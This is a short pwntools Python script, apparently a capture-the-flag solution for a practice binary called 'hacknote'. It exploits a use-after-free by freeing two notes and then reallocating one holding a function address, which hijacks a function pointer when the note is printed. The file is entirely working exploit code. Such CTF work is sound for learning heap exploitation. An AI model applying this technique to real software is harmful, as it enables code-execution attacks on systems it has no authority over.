#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

io = process("./hacknote")

def addnote(size, content):
    io.sendlineafter(":", "1")
    io.sendlineafter(":", str(size))
    io.sendlineafter(":", content)

def delnote(idx):
    io.sendlineafter(":", "2")
    io.sendlineafter(":", str(idx))

def printnote(idx):
    io.sendlineafter(":", "3")
    io.sendlineafter(":", str(idx))

magic_addr = 0x8048986

addnote(32, "aaaa")#add note 0
addnote(32, "ddaa")#add note 1

delnote(0)
delnote(1)

addnote(8, p32(magic_addr))

printnote(0)

#  io.interactive()
print io.recv()
io.close()
